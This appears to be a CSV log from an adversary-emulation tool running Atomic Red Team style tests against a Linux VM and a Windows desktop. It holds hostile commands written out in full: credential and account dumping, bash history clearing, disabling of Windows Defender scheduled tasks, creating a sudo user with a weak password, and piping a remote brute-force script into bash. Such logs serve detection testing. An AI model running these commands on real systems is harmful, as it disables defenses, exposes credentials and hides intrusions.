Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2025-10-01T20:42:02Z,Custom - Encoded PowerShell Test (110000),bydmzm,onisa-VirtualBox,52772,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt
2025-10-01T20:42:02Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,2880,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
2025-10-01T20:42:27Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,52782,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T20:42:27Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,5308,cmdkey /list,cmdkey /list
2025-10-01T20:43:23Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,52789,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T20:43:23Z,WMI Reconnaissance List Remote Services,maqmre,DESKTOP-B2K36HT,760,wmic /node:"127.0.0.1" service where (caption like "%Spooler%"),wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
2025-10-01T20:44:13Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,52808,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T20:44:13Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,6308,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T20:45:14Z,Dump history,bydmzm,onisa-VirtualBox,52816,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T20:45:14Z,iwr or Invoke Web-Request download,maqmre,DESKTOP-B2K36HT,2796,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
2025-10-01T20:46:39Z,Account Discovery (targeted),bydmzm,onisa-VirtualBox,52880,getent passwd | cut -d: -f1,getent passwd | cut -d: -f1
2025-10-01T20:46:39Z,Prevent Powershell History Logging,maqmre,DESKTOP-B2K36HT,1740,Set-PSReadlineOption -HistorySaveStyle SaveNothing,Set-PSReadlineOption -HistorySaveStyle SaveNothing
2025-10-01T20:46:44Z,SUDO Brute Force - Debian,bydmzm,onisa-VirtualBox,52884,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-10-01T20:47:29Z,Clear Bash history (cat dev/null),bydmzm,onisa-VirtualBox,52901,cat /dev/null > ~/.bash_history,cat /dev/null > ~/.bash_history
2025-10-01T20:48:04Z,Packet Capture Linux using tshark or tcpdump,bydmzm,onisa-VirtualBox,52909,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33
2025-10-01T21:08:45Z,Custom - Encoded PowerShell Test (110000),bydmzm,onisa-VirtualBox,53444,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt
2025-10-01T21:08:48Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,11140,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
2025-10-01T21:08:51Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,53443,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T21:08:52Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,276,cmdkey /list,cmdkey /list
2025-10-01T21:08:54Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,53457,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T21:08:54Z,WMI Reconnaissance List Remote Services,maqmre,DESKTOP-B2K36HT,1740,wmic /node:"127.0.0.1" service where (caption like "%Spooler%"),wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
2025-10-01T21:08:55Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,53463,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T21:09:00Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,1256,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T21:09:01Z,Dump history,bydmzm,onisa-VirtualBox,53467,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T21:09:01Z,iwr or Invoke Web-Request download,maqmre,DESKTOP-B2K36HT,1572,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
2025-10-01T21:09:02Z,Account Discovery (targeted),bydmzm,onisa-VirtualBox,53452,getent passwd | cut -d: -f1,getent passwd | cut -d: -f1
2025-10-01T21:09:02Z,Prevent Powershell History Logging,maqmre,DESKTOP-B2K36HT,7028,Set-PSReadlineOption -HistorySaveStyle SaveNothing,Set-PSReadlineOption -HistorySaveStyle SaveNothing
2025-10-01T21:09:02Z,SUDO Brute Force - Debian,bydmzm,onisa-VirtualBox,53453,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-10-01T21:09:12Z,Clear Bash history (cat dev/null),bydmzm,onisa-VirtualBox,53456,cat /dev/null > ~/.bash_history,cat /dev/null > ~/.bash_history
2025-10-01T21:09:17Z,Packet Capture Linux using tshark or tcpdump,bydmzm,onisa-VirtualBox,53446,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33
2025-10-01T21:10:17Z,Packet Capture Linux using tshark or tcpdump,bydmzm,onisa-VirtualBox,53482,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33,tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33
2025-10-01T21:10:18Z,Clear Bash history (cat dev/null),bydmzm,onisa-VirtualBox,53483,cat /dev/null > ~/.bash_history,cat /dev/null > ~/.bash_history
2025-10-01T21:10:22Z,SUDO Brute Force - Debian,bydmzm,onisa-VirtualBox,53503,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-10-01T21:10:22Z,Prevent Powershell History Logging,maqmre,DESKTOP-B2K36HT,6444,Set-PSReadlineOption -HistorySaveStyle SaveNothing,Set-PSReadlineOption -HistorySaveStyle SaveNothing
2025-10-01T21:10:22Z,Account Discovery (targeted),bydmzm,onisa-VirtualBox,53494,getent passwd | cut -d: -f1,getent passwd | cut -d: -f1
2025-10-01T21:10:22Z,iwr or Invoke Web-Request download,maqmre,DESKTOP-B2K36HT,7704,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
2025-10-01T21:10:22Z,Dump history,bydmzm,onisa-VirtualBox,53500,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T21:10:27Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,6176,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T21:10:32Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,53502,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T21:10:32Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,53505,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T21:10:32Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,53507,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T21:10:32Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,8220,cmdkey /list,cmdkey /list
2025-10-01T21:10:35Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,10648,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
